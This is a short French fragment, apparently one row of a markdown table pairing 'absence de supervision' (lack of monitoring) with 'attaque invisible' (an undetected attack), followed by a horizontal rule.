| Absence de supervision | Attaque invisible    |

---
